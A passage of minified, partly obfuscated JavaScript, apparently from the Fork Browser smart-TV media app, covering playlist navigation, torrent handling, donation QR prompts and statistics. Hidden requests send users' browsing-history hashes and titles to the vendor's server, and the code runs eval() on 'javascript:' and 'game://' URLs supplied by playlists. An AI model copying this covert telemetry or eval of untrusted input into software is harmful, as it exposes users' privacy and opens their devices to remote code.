if(!pq.goBack){if(pq.l10I0O1I1lRl0QlI1OYpr.get("url")==c.lO10111O0001lOl00Ypr||pq.l10I0O1I1lRl0QlI1OYpr.get("url")==c.SAVE_lO10111O0001lOl00Ypr){pq.l10I0O1I1lRl0QlI1OYpr.put("img",c.global.icon);pq.l10I0O1I1lRl0QlI1OYpr.put("title",c.global.title);if(pq.pl_serv)pq.l10I0O1I1lRl0QlI1OYpr.put("url",c.lO10111O0001lOl00Ypr)}else{if(pq.l10I0O1I1lRl0QlI1OYpr.get("url").indexOf("#group=")>0&&pq.l10I0O1I1lRl0QlI1OYpr.get("url").split("#group")[0]==c.SAVE_lO10111O0001lOl00Ypr.split("#group")[0]){pq.l10I0O1I1lRl0QlI1OYpr.put("title",c.global.title);pq.l10I0O1I1lRl0QlI1OYpr.put("url",c.SAVE_lO10111O0001lOl00Ypr)}else{pq.l10I0O1I1lRl0QlI1OYpr.put("s",pq.elCh.index);pq.l10I0O1I1lRl0QlI1OYpr.put("top",gV(pq,"top"));var x={"url":(c.SAVE_lO10111O0001lOl00Ypr||c.lO10111O0001lOl00Ypr),"img":c.global.icon,"title":c.global.title};if(gV(pq.elCh,"local")!=="")x.l=pq.elCh.local;if(gV(pq.origelCh,"parser")!=="")x.p=pq.origelCh.parser;if(gV(pq.origelCh,"parser2")!=="")x.p2=pq.origelCh.parser2;if(gV(pq.origelCh,"mb_parser")!=="")x.mp=pq.origelCh.mb_parser;pq.l10I0O1I1lRl0QlI1OYpr.history.push(x);pq.l10I0O1I1lRl0QlI1OYpr.fwhistory=[]}
pq.l10I0O1I1lRl0QlI1OYpr.save()}
if(typeof pq.elCh.search=="object"||(c.SEARCH_TEMPL.indexOf("%s")>0&&gV(pq.inputed,"text")!=""&&String(gV(pq.elCh,"title")).match(/(поиск|search|искать|найти|пошук)/i)&&!is_local(c.lO10111O0001lOl00Ypr))){if(c.IFRAMES.length)var p="iframe";else p="site";title=pq.elCh.title;img=pq.elCh.logo_30x30;var x=pq.l10I0O1I1lRl0QlI1OYpr.get(null,-2);if(x&&!l0OII100kdNdQl01lYpr(x.url)){if(String(x.title).length<15)title=x.title+" "+title;img=gV(x,"img")}
if(typeof pq.elCh.search=="object"){if(gV(pq.elCh.search,"title")!="")title=gV(pq.elCh.search,"title");if(gV(pq.elCh.search,"icon")!="")img=gV(pq.elCh.search,"icon");if(gV(pq.elCh.search,"playlist_url")!="")c.SEARCH_TEMPL=gV(pq.elCh.search,"playlist_url")}
c.addToSearchHist(c.SEARCH_TEMPL,p,title,img)}}
c.renderPage(pq)}}catch(e){jsshowErr("parse pl "+e.message);c.sendStat(-1,pq)}},openUrl:function(pq,xml_url){var c=this;if(pq.elCh.cors)c.xhr=uHelper.create(pq.elCh.cors);else if(xml_url.match(/^(\/|usb:\/\/)/)){pq.elCh.local="direct";c.xhr=uHelper.create("directnoheader")}else c.xhr=uHelper.create("direct|rf|xml");c.xhr.ua=navigator.userAgent;c.xhr.parse=function(s){maJor.statusbar("off");clearTimeout(c.tTimer);if(c.canceled){return}
pq.source=s;c.oncomplete(pq,c.xhr.status)}
if(xml_url=="http://cloudflare.appfxml.com/browseraccount/?do=fexport#POSTs=userdata"){if(maJor.user){var g="";for(var i in allfs){var s=maJor.read(allfs[i]);g+=s+"[-..-]"}
xml_url=xml_url.replace("userdata",mB64.encrypt(g))+"&rev=4"}else{c.cancel();kjtYpr.inf("Need login!",1500)}}
var ref=gV(pq.l10I0O1I1lRl0QlI1OYpr.page,"lO10111O0001lOl00Ypr");if(ref==xml_url||ref.indexOf("http")!=0)ref="";maJor.statusbar(xml_url,"link");if(pq.elCh.timeout)c.xhr.atime=pq.elCh.timeout*1000;if(xml_url.indexOf("=postmd5")>0){if(xml_url.indexOf("#POST")>0)xml_url+="&"+"postmd5="+encodeURIComponent(pq.elCh.postmd5);else xml_url+="#POSTpostmd5="+encodeURIComponent(pq.elCh.postmd5)}
c.URL_REQUEST=xml_url;if(xml_url.indexOf("#POST")>0){c.xhr.postdata=xml_url.split("#POST")[1];xml_url=xml_url.split("#POST")[0]}
if(!is_local(xml_url)&&maJor.params.get("headers")>0&&ref){if(maJor.platform()=="maple"&&!maJor.box_low)c.xhr.addheaders["Save-Data"]=ref;else c.xhr.addheaders.Accept=ref}
if(pq.elCh.local!="direct"&&!xml_url.match(/(pastebin\.com)/)){xml_url=maJor.addident(xml_url);if(pq.refresh&&xml_url.indexOf("&refresh=true")==-1){pq.refresh=!1;xml_url+="&refresh=true"}
xml_url=xml_url.replace(/#submenu\d+$/,"")}
c.xhr.get(xml_url);if(maJor.lastpaydlog&&T.timestamp-maJor.lastpaydlog<102800){}else if(maJor.tgid&&maJor.tgs){if(Math.random()>0.95)uHelper.create("directnoheader").hid().getI(maJor.parsers.link()+"VilkaDB/?id=tg&m=ping")}else if(maJor.timestamp<3&&!is_xxx()&&!is_xxx(xml_url)&&xml_url.indexOf("http://cloudflare.appfxml.com")!=0){var raznS=3900;if(maJor.user&&maJor.user.vf)raznS=raznS*2;maJor.lastShowQR=maJor.lastShowQR||(T.timestamp-raznS+90);if(T.timestamp-maJor.lastShowQR>raznS){if(Math.random()>0.4&&maJor.ipCountry!=="UA"){if(Math.random()>0.98)c.showCode(4);else c.showCode(3)}else if(maJor.ipCountry=="UA"&&Math.random()>0.8&&!maJor.tgs){c.showCode(4)}else if(!maJor.user||!maJor.user.vf){if(Math.random()>0.95){maJor.updateLogin(1)}
if(maJor.user&&!maJor.user.vf){c.showCode(1)}else c.showCode(2)}
maJor.lastShowQR=T.timestamp}}},showCode:function(n){var mes="",mimg="",mes2="<div>Отсканируйте QR код</div>",w=320,border;if(n==1){mimg=maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=enterqr&vf=1");mes="<b>Подтвердите свою почту</b><br><i>"+maJor.user.email+"</i><br> в Fork browser, для улучшения безопасносности профиля!"}else if(n==2){mimg=maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=enterqr");mes="Зарегистрируйте свой профиль в Fork browser в один клик, чтобы не потерять и синхронизировать ваши данные!"}else if(n==3){mes="<span style='font-size: 21px; color: #e7e7e7;'><b>Благодарим за использование Fork Browser!</b><br><i style='font-size: 20px;'>Поддержите развитие проекта и получите доступ к дополнительным функциям.</i></span>";mimg=maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=qr");mes2="<div style='font-size: 20px; color: #dddddd;margin-top:4px;'>"+(maJor.ipCountry=="--RU"?"Оплатите сейчас через СБП":"<b>Отсканируйте QR-код и оплатите прямо сейчас!</b>")+"</div>";w=500;border="3px solid #9E9E9E"}else if(n==4){mimg=maJor.addident(maJor.parsers.link()+"VilkaDB/?id=tgqr");mes="<b>Подпишитесь на канал новинок кино</b><br><i>VilkaDB1</i>";mes2+="<br><i style='font-size: 10px;color: #c1c1c1;'>И отключите получение уведомлений.</i>"}
if(mes){var img=document.createElement('img');img.onload=function(){var closeButton='<div style="float: right;"><button onclick="$_(\'hint\') && $_(\'hint\').parentNode && $_(\'hint\').parentNode.removeChild($_(\'hint\'));" style="background: transparent; border: none; font-size: 18px; color: white; cursor: pointer;">✖</button></div>';maJor.hint(closeButton+mes+'<br><img onclick="window.open(\''+maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=qrlink")+'\');" width="150" height="150" alt="QR code" src="'+mimg+'">'+mes2,"kb6","#3e6787",w,border)};img.src=mimg}},sendStat:function(m,pq){var c=this;if(maJor.box_low)return;if(m==-1){maJor.seSt=[];if(!c.sendedstat){if(pq.elCh&&pq.elCh.type=="enterurl"){maJor.hint('<img style="float: left;margin: 2px 6px 0px 0px;width: 25px; height: 25px; background: #9e9e9e;" src="'+_img("_ST_page_fav_off_white.png")+'">'+"Добавьте этот сайт в закладки или Стартовое меню, чтоб не потерять его!","kb5");uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderStat&m="+((c.channels.length&&c.ERR==null)?"c":"f")+"&ver=3#POSTs="+encodeURIComponent(c.lO10111O0001lOl00Ypr)+"&img="+encodeURIComponent(c.icon))}else if(c.ERR==404||c.channels.length==0){uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderStat&m=e&ver=3#POSTs="+encodeURIComponent(c.lO10111O0001lOl00Ypr)+"&parent="+encodeURIComponent(c.parentURL)+"&img="+encodeURIComponent(c.icon))}}
c.sendedstat=1}else if(!c.sendedstat2){var n=0,u="",t="";for(var i=Il01QllQll().history.length-1;i>-1;i--){if(Il01QllQll().history[i].url.indexOf("about")==0){n=i;break}}
var sp=[],sendsp=0;if(m==0)sendsp=-2;for(i=n+1;i<Il01QllQll().history.length;i++){if(u!="")u+="-";if(t!="")t+="-|-";var ur=Il01QllQll().history[i].url.replace(/http.*?\/treeview/,"http://remotefork/treeview");u+=md5(ur);t+=Il01QllQll().history[i].title;var ks=Il01QllQll().history[i];if(sendsp==0)sendsp=1;if(ks.url.indexOf("http")!=0||(is_local(ks.url)&&maJor.params.get("remote")&&maJor.params.get("remoteactive"))){sendsp=-1;continue}
var tim=ks.img;if(ks.url.match(/(#submenu|no_save)/))continue;else if(ks.url.indexOf("alexkdpulg.php?list=")>0)var tu=unescape(ks.url.split("?list=")[1]);else if(ks.url.indexOf("alexkdpulg.php")>0){sendsp=-1;continue}else tu=ks.url;if(tu.lastIndexOf("?")==tu.length-1)tu=tu.substr(0,tu.length-1);tu=tu.replace(/[\?&#](iu=|bc=true|box_mac=).*/,"");var ttl=maJor.fp(ks.title);var tmp={"url":tu,"title":ttl,"img":tim};if(tmp.url.length<120)sp.push(tmp)}
if(tp>0.15){return}
if(ttmac)kjtYpr.popUp("Send SendSP="+sendsp,1500);if(sendsp==1&&m==1)uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=add3#POSTs="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(sp)));else{}
var tp=Math.random();uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php#POSTu="+u+"&m="+m+"&t="+encodeURIComponent(t));c.sendedstat2=1}
if(maJor.seSt.length){uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderSearches&ver=12&#POSTs="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(maJor.seSt)));maJor.seSt=[]}},toSource:function(pq){var c=this;var u=c.lO10111O0001lOl00Ypr;var source=gV(c.l10I0O1I1lRl0QlI1OYpr.page,"source");if(source==""){var d=c.l10I0O1I1lRl0QlI1OYpr.page.global;d.channels=c.l10I0O1I1lRl0QlI1OYpr.page.channels;source=l1OOl0I0IASY10lQ10Ypr(d)}
if(u.indexOf("no_save")>0)u=u.substring(0,Math.ceil(u.length-u.length/2.5));var r=/\\u([\d\w]{4})/gi;pq.data={};pq.data.before="<textarea id='scrolltextarea' style='overflow-y:scroll;width:100%;background-color:#eeeeee;color:black;height:610px;'>"+source.replace(/no_save/g,"").replace(r,function(match,grp){return String.fromCharCode(parseInt(grp,16))})+"</textarea>";c.toChannels(pq)},listGroup:function(sel){var c=this;var t=c.lO10111O0001lOl00Ypr.split("#group=");if(sel==null){var submenu=[];for(var i=0;i<c.group.length;i++){var el={"title":"<span id='tmpGroupSel"+i+"' style='color:white;'>"+c.group[i]+"</span>","playlist_url":"group="+i};if(c.menu.length<9)c.menu.push(el);else submenu.push(el)}
if(submenu.length)c.menu.push({"title":"<span style='color:white;'>&raquo; ("+(c.group.length-9)+")</span>","playlist_url":"submenu","submenu":submenu});if(t.length>1)c.listGroup(t[1]);else{setTimeout(function(){$_("tmpGroupSel0").style.color="#ffc71e"},500)}}else{if(sel<0)sel=c.group.length-1;else if(sel>c.group.length-1)sel=0;chGroupSel=sel;if(chGroupSel==0){c.channels=c.origchannels}else{c.channels=[];for(var i=0;i<c.origchannels.length;i++){var z=(c.origchannels[i].group||"").split(";");for(var j=0;j<z.length;j++){if(z[j]==c.group[chGroupSel]){c.channels.push(c.origchannels[i]);break}}}}
Il01QllQll().focused(0);setTimeout(function(){$_("tmpGroupSel"+chGroupSel).style.color="#ffc71e"},500)}},openCh:function(pq){var c=this;l10I0O1I1lRl0QlI1OYpr=pq.l10I0O1I1lRl0QlI1OYpr;if(l10I0O1I1lRl0QlI1OYpr==null)l10I0O1I1lRl0QlI1OYpr=Il01QllQll();c.l10I0O1I1lRl0QlI1OYpr=l10I0O1I1lRl0QlI1OYpr;modeGroup=!1;if(handler=="move"||(handler=="player"&&adsPage.state()))return;if($_("MenuCh").style.display=="block"){Menu=[];$_("MenuCh","");$_("MenuCh").style.display="none";maJor.setHandler("menu")}
is_loadpage(1);if(pq.inputed||$_("vk").style.display!="none"){if(gV(pq.elCh,"regex")){if(!(new RegExp(gV(pq.elCh,"regex")).test(gV(pq.inputed,"text")))){maJor.inf((pq.elCh.error||"Error format! "+gV(pq.elCh,"regex")),2500,"red");stopLoadPage();return}}
VK.close(1)}
chGroupSel=0;if(ll1lIRuOcl10I1OYpr>0){clearTimeout(lI0I10I1eIlQ1I10Ypr);ll1lIRuOcl10I1OYpr=0;is_loadpage(-1);kjtYpr.inf("Прервано!",800);stopLoadPage();return}
if(maJor&&maJor.urlFilter&&pq.elCh&&pq.elCh.playlist_url){pq.elCh.playlist_url=maJor.urlFilter(pq.elCh.playlist_url);pq.origelCh}
elCh=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.toTags(pq.elCh,pltags)));elGlobal=c.toTags(pq.elGlobal,pltags);if(elCh.onclick){if(elCh.onclick=="autouserexport()"){autoexport("user");setTimeout(function(){elCh.onclick="";pq.elCh=elCh;c.openCh(pq)},3000);return}}
c.parentCh=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(elCh));if(!c.l01lI10Il1zvj10lI1Ypr)kjtYpr.lastSearch="";if(elCh.playlist_url&&elCh.playlist_url.indexOf("group=")==0&&typeof c.l10I0O1I1lRl0QlI1OYpr.page!="undefined"){var g=elCh.playlist_url.substr(6);var gu=c.l10I0O1I1lRl0QlI1OYpr.page.SAVE_lO10111O0001lOl00Ypr.split("#group")[0];if(prev[gu]){c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=gu+"#group="+g;pq.data=prev[gu];c.toChannels(pq);return}}
if(elCh.stream_url.match(/\.torrent$/)&&elCh.stream_url.indexOf("torrent://")!=0){elCh.playlist_url="torrent://"+elCh.stream_url;elCh.stream_url=""}
if(elCh.stream_url.match(/^(torrent|magnet:|cmd:)/)){elCh.playlist_url=elCh.stream_url;elCh.stream_url=""}
var ar=["playlist_url","stream_url","parser","parser2","mb_parser"];for(elem in ar)elCh[ar[elem]]=trylink(gV(elCh,ar[elem]));ar=["parser","parser2","mb_parser"];for(tag in ar){if(elCh[ar[tag]]){var params={"ch":elCh,"pq":pq,"tag":ar[tag]};params.callback=function(a_pq){if(a_pq.selfReNewBookmark){var data=a_pq.selfReNewBookmark.page,title=gV(a_pq.selfReNewBookmark.parse,2);if(data){FXMLPage.selfpages[gV(a_pq.selfReNewBookmark.parse,0)]=data;maJor.each(data.channels,function(val){if(val.title==title){val.index=a_pq.elCh.index;a_pq.elCh=val;c.openCh(a_pq);return!1}})}}else c.openCh(a_pq)}
return c.lI1QlIlO1zHuo1001Ypr(params)}}
if(c.preOpen(pq)){is_loadpage(0);return}
if(elCh.stream_url+elCh.playlist_url=="description"){vPlayer.description(elCh.description);c.cancel();return}
if(elCh.playlist_url.indexOf("cmd:")==0){pq.data={"cmd":elCh.playlist_url.substr(4)};c.handlerData(pq,l10I0O1I1lRl0QlI1OYpr.lO10111O0001lOl00Ypr);return c.cancel()}
c.SEARCH_TEMPL="";if(elCh.stream_url+elCh.playlist_url.indexOf("SearchName")==0){}else if(elCh.playlist_url&&!elCh.stream_url){if(elCh.playlist_url.indexOf("view-source:")===0){if(!prev[elCh.playlist_url]){if(elCh.playlist_url.substr(12)==c.parentURL){return c.toSource(pq)}else{c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=elCh.playlist_url=elCh.playlist_url.substr(12);pq.tosource=1}}else pq.tosource=1}
if(maJor.app_cors&&elCh.playlist_url.indexOf("alexkdpulg.php?list=")>0){elCh.playlist_url=decodeURIComponent(elCh.playlist_url.split("?list=")[1])}
if(this.xhr){delete this.xhr}else{if(elCh.window)c.IS_SUBMENUURL=1;else c.IS_SUBMENUURL=0;xml_url=elCh.playlist_url;if(pq.inputed){if(xml_url.indexOf("{search}")!=-1){c.SEARCH_TEMPL=xml_url.replace("{search}","%s");xml_url=xml_url.replace("{search}",encodeURIComponent(pq.inputed.text))}else{c.SEARCH_TEMPL=sU(xml_url,"search=%s");xml_url=sU(xml_url,"search="+encodeURIComponent(pq.inputed.text))}
c.SAVE_lO10111O0001lOl00Ypr=xml_url}
c.lO10111O0001lOl00Ypr=xml_url;var data=0;if(xml_url.indexOf("about:")===0){if(xml_url=="about:blank"&&pq.mode=="refresh")uHelper.updateGrid();data=getVars(xml_url,pq)}else if(xml_url.match(/^(zakladki|bookmarks)/)){data=xhr_bookmark(xml_url)}
if(data!==0){if(data==null){if(xml_url.match(/^(zakladki|bookmarks)/))kjtYpr.inf("_FPZdesPusto_!",1000);return c.cancel()}else{pq.data=data;c.toChannels(pq);maJor.statusbar("off")}}else if(xml_url.indexOf("alert(")==0||xml_url.indexOf("javascript:alert(")==0){confirmed.create(xml_url.match(/alert\((.*)\)/)[1],c.l10I0O1I1lRl0QlI1OYpr.page.XML_DOMAIN,"OK")}else if(xml_url.indexOf("#archive")>0){if(xml_url.indexOf("#archive|")==-1){var v=curCh();xml_url+="|"+gV(v,"title")+"|"+(v.epgcode||v.epg)+"|-"+v.catchup_days+"|"+v.catchup+"|"+v.catchup_source+"|"+gV(v,"tvg-shift")}
c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=xml_url;var mc=xml_url.split("#archive|");var d=mc[1].split("|");var ch=[],logo="";pq.l10I0O1I1lRl0QlI1OYpr.put("s",getSelect());pq.l10I0O1I1lRl0QlI1OYpr.put("top",gV(pq,"top"));if(d[1]==""){kjtYpr.inf("Нету телепрограммы! Запустите канал и перематывайте вручную",1800);return}else{if(d[1].indexOf("xmltv-")==0){if(typeof(JtvSRC)=="undefined")JtvSRC={};JtvSRC[md5(mc[0]).substr(0,7)]=mc[0];var u="http://exec4.remotecurl.appfxml.com/curl/epg.php?do=xmltv&ver=2&cmd=epg&src="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(JtvSRC))+"&mode=full&get="+d[1]+"&start="+d[2]}else{logo="http://"+getJserv()+"/img/"+d[1]+".png";u="http://"+getJserv()+"/sip.php?do=full&ver=2&get="+encodeURIComponent(d[1])+"&start="+d[2]}
uHelper.create("directnoheader").getI(u).parse=function(s){if(c.canceled){return}
var ch=[];var m=lIlI1VBOOlI01QYpr(s);if(m&&m[d[1]]){fEpg.epg_time=m.now||T.timestamp;ch=fEpg.toArchive({epg:m[d[1]],url:mc[0],params:d,logo:logo})}else ch=fEpg.toArchive({url:mc[0],params:d,logo:logo});c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=xml_url+"|";data={"icon":logo,"title":"_FPArchive_ "+d[0],"options":"hidedescription","channels":ch};pq.data=data;c.toChannels(pq)}}}else if(xml_url.indexOf("AddFavorite(")==0){var m=xml_url.match(/AddFavorite\((.*?)\)/)[1];if(m==""){insetSelect=oInset.tabs.length+1;Il01QllQll().focused(-1);Il01QllQll().focused(-1);ContextMenu.show("favmenu")}else{m=m.split(",");if(m.length==3){favarray={};favarray.stream_url="";favarray.search_on="";favarray.playlist_url=m[2];favarray.title=m[0];favarray.logo_30x30=m[1];insetSelect=oInset.tabs.length+1;Il01QllQll().focused(-1);Il01QllQll().focused(-1);ContextMenu.show("favmenu")}else kjtYpr.inf("Error format! Must be AddFavorite(title,icon,url); or AddFavorite();",2000)}}else if(xml_url.indexOf("AddSearch(")==0){var m=xml_url.match(/AddSearch\((.*?)\)/)[1];m=m.split(",");if(m.length==3){FXMLPage.addGl(m[2],null,m[0],m[1])}else kjtYpr.inf("Error format! Must be AddSearch(title,icon,url search);",2000)}else if(xml_url.indexOf("app://")==0){var ch=pq.elCh;confirmed.create("Приложение появится в смартхаб<br>"+ch.title,"Установить данное приложение?").fun=[function(){var c=ch.playlist_url.substring(6);setTimeout(function(){is_loadpage(1);if(c.indexOf("http")==0)vPlayer.maple.savezipfile(c,ch.title);else{vPlayer.maple.savezipfile("http://staticdata.appfxml.com/widget/app/"+c)}},500)}]}else if(xml_url.indexOf("cmdsetWeatherId")==0){maJor.params.set("weather",xml_url.substring(15));$_("weather").style.display="none";maJor.updateWeather();c.cancel()}else if(xml_url.indexOf("extensions://")==0){c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=xml_url;kjtYpr.llI1lOll11oDMl00IOYpr({"channels":[{"title":"Run extension...","playlist_url":xml_url}]},select,request_id);$_("ext").style.display="block";if(xml_url.indexOf("xsmart")>0)$_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; -webkit-transform: scaleX(1.13);" width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');else $_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; " width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');$_("frame-id").contentWindow.document.addEventListener('keyup',function(e){if(e.keyCode==37){i--}});kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущено расширение<br>"+"Меню - Закрыть расширение<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);ext_focus()}else if(xml_url.indexOf("payd_")==0){if(pq.elCh.menu)return ContextMenu.show("onlymenu");var val=pq.inputed?pq.inputed.text:gV(pq.elCh,"value");gP().channels[pq.elCh.index].value=gP().input[pq.elCh.playlist_url.substring(5)]=val;gP().count=0;gP().renderChannels(getSelect());Il01QllQll().focused();is_loadpage(0)}else if(xml_url.indexOf("game://")==0){var c=xml_url.substring(7);tgame=c;setTimeout(function(){is_loadpage(0);eval(c+"();");kjtYpr.popUp("<b>Управление:</b><br>ОК: Вверх<br>Вниз: Снижение")},300)}else if(xml_url.indexOf("html://")==0){confirmed.create("<b>"+xml_url.substring(7)+"</b>","_FPOpen URL? This application will be closed_").fun=[function(){gP().lO10111O0001lOl00Ypr=gP().SAVE_lO10111O0001lOl00Ypr=xml_url;lll1IlIlOBP_II1lYpr();uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderStat&ver=3#POSTs="+encodeURIComponent(pq.elCh.playlist_url)+"&img="+gV(pq.elCh,"logo_30x30"));document.location=xml_url.substr(7)}]}else if(xml_url.indexOf("javascript:")==0){var jsCode=xml_url.split("javascript:")[1];try{eval(jsCode)}catch(e){confirmed.create('Ошибка выполнения javascript:<br>'+e.message,gP().XML_DOMAIN)}}else if(xml_url=="submenu"){c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=c.l10I0O1I1lRl0QlI1OYpr.page.lO10111O0001lOl00Ypr+"#submenu"+pq.elCh.index;pq.data=prev[c.l10I0O1I1lRl0QlI1OYpr.page.SAVE_lO10111O0001lOl00Ypr.split("#submenu")[0].split("#group=")[0]];pq.data.returnSelect=0;c.toChannels(pq)}else if(xml_url.indexOf("cmdmenu")==0){ContextMenu.show()}else if(xml_url=="cmdAbout"||xml_url=="cmdOpenStart"||xml_url=="cmdHelp"||xml_url.indexOf("cmdSetWeather")==0||xml_url.indexOf("cmdSetSearch")==0){ContextMenu.play(xml_url)}else if(xml_url.indexOf("forkdlna")==0&&maJor.params.get("remoteip")==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!")}else if(gV(pq.elCh,"js_url")!=""){clearInterval(kjtYpr.IntervalUpdateTime);clearInterval(kjtYpr.GlUpdateTime);lI0Il1OrlwllI1Ypr(pq.elCh.js_url)}else{if(xml_url.indexOf("xml://")==0)xml_url=xml_url.substring(6);if(xml_url.indexOf("torrent://")==0||xml_url.indexOf("magnet")==0){var c1=xml_url.replace("torrent://","");if(maJor.params.get("torrserveactive")){if(!maJor.widgets.all.torrserve||parseFloat(maJor.widgets.all.torrserve.version)>=1.2)xml_url="http://"+getip("torrserve")+"/stream/playlists.m3u?link="+encodeURIComponent(c1)+"&m3u";else xml_url="http://"+getip("torrserve")+"/torrent/play?m3u=true&link="+encodeURIComponent(c1)}else if(maJor.params.get("torrserve2active")){if(!maJor.widgets.all.torrserve2||parseFloat(maJor.widgets.all.torrserve2.version)>=1.2)xml_url="http://"+getip("torrserve2")+"/stream/playlists.m3u?link="+encodeURIComponent(c1)+"&m3u";else xml_url="http://"+getip("torrserve2")+"/torrent/play?m3u=true&link="+encodeURIComponent(c1)}else if(maJor.params.get("acestreamactive"))xml_url="http://"+getip("acestream")+"/server/api?method=analyze_content&query="+encodeURIComponent(c1);else if(maJor.build>=7){elCh.url=c1;vPlayer.llll1Zvc0cl1QllOYpr(elCh);return}else return remoteAsk()}else if(xml_url.indexOf("torrentb64://")==0){if(maJor.params.get("acestreamactive")){c.xhr=uHelper.create("direct");c.xhr.parse=function(s){var data=lIlI1VBOOlI01QYpr(s);if(gV(data,"id")!="")c.openUrl(pq,"http://"+getip("acestream")+"/server/api?method=get_media_files&content_id="+data.id);else kjtYpr.inf("Error get acestream content id",1500)}
c.xhr.postdata="data="+encodeURIComponent(xml_url.substring(13));c.xhr.get("http://api.torrentstream.net/upload/json")}else remoteAsk()}
if(xml_url.indexOf("hms")==0){is_type="hms";var data={"playlist_name":"","channels":[]};if(xml_url=="hms"){data.channels.push({"title":"_FPNastroiki_ HMS!","playlist_url":"hms://settings","logo_30x30":"none"});if(maJor.params.get("remoteip")==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!");return""}else{maJor.params.set("hms",maJor.params.get("remoteip").split(":")[0]+":45397");xml_url="http://"+maJor.params.get("hms")+"/MediaServer/Folders/0?start=0;count=0"}}}
if(xml_url.indexOf("forkdlna")==0)xml_url="http://"+getip("remoteip")+"/treeview?/";if(xml_url.indexOf("tv/wlist.php")>-1)kjtYpr.popUp("Fork Store App Market<br>_FPPrilUstSh_");c.lO10111O0001lOl00Ypr=xml_url;var ref=pq.l10I0O1I1lRl0QlI1OYpr.get("url",-2);if(ref=="")ref=c.lO10111O0001lOl00Ypr;if(ref.indexOf("http")!=0||ref.match(/(filmix)/))ref="";if(xml_url){if(xml_url.match(/(\?|&)payd=on(&|$)/)){c.SAVE_lO10111O0001lOl00Ypr+="#cache_miss";for(var i in pq.input){xml_url=sU(xml_url,"&payd_"+i+"="+encodeURIComponent(pq.input[i]))}}else if(xml_url.indexOf("=payd_")>0){c.SAVE_lO10111O0001lOl00Ypr+="#cache_miss";for(var i in pq.input){xml_url=xml_url.replace("=payd_"+i,"="+encodeURIComponent(pq.input[i]))}}
c.openUrl(pq,xml_url)}
if(xml_url.indexOf("box_user")>0)xml_url=xml_url.replace(/box_user/g,"box_user2");if(xml_url.indexOf("box_mac")>0)xml_url=xml_url.replace(/box_mac/g,"box_mac2")}}}else if(elCh.stream_url!=""){if(!vPlayer.stopped)vPlayer.easystop();pq.l10I0O1I1lRl0QlI1OYpr.put("s",pq.elCh.index);pq.l10I0O1I1lRl0QlI1OYpr.put("top",gV(pq,"top"));pq.l10I0O1I1lRl0QlI1OYpr.save();if(is_audio(elCh.stream_url)&&maJor.params.get('audioplayer')>0&&!pq.mode){vPlayer.audio.play(pq.l10I0O1I1lRl0QlI1OYpr.page.channels,getSelect());return c.cancel()}
elCh.url=elCh.stream_url.replace(/\\\//g,"/");elCh.openwith=pq.mode;if(!c.adv(elCh))vPlayer.stream.create(elCh)}else{c.cancel();kjtYpr.inf("Пустая ссылка!",1500)}},};var markedObj={cancel:function(p){if(p==null)var curPage=gP();else curPage=p;if(curPage){for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]&&$_("titleid"+i)){$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}
curPage.is_mark_array={};curPage.marked=0;curPage.is_mark=0},entries:function(fun){var curPage=gP();if(!curPage.is_mark){try{fun(curPage.channels[getSelect()],getSelect())}catch(e){}}else{for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]){try{fun(curPage.channels[i],i)}catch(e){}}}}
return this}}
function arrDelValue(a,v){for(var i in a){if(a[i]==v)a.splice(i,1)}
return a}
var rid=0,rcurlUrl="",lastUrl={};var uHelper={create:function(method,ccount,parent){try{var c=Object.create(this);c.defMethod=method;if(String(method)=="local")method="directnoheader";c.request_id=++rid;c.method=String(method).split("|");var newMethod=[];for(var i=0;i<c.method.length;i++){if(c.method[i].match(/rf|direct|remote|android|xml|local|proxy|directnoheader/)){newMethod.push(c.method[i])}}
c.method=newMethod;if(c.method.length==0)c.method=["direct","rf"];if(maJor.params.get("remote")==0||!maJor.params.get("remoteactive"))c.method=arrDelValue(c.method,"rf");var nd=-1;for(var i in c.method){if(c.method[i].indexOf("direct")==0)nd=i;if(c.method[i]=="direct"&&maJor.params.get("headers")>0&&c.method.join("|").indexOf("directnoheader")==-1){c.method.splice((i+1),0,"directnoheader")}}
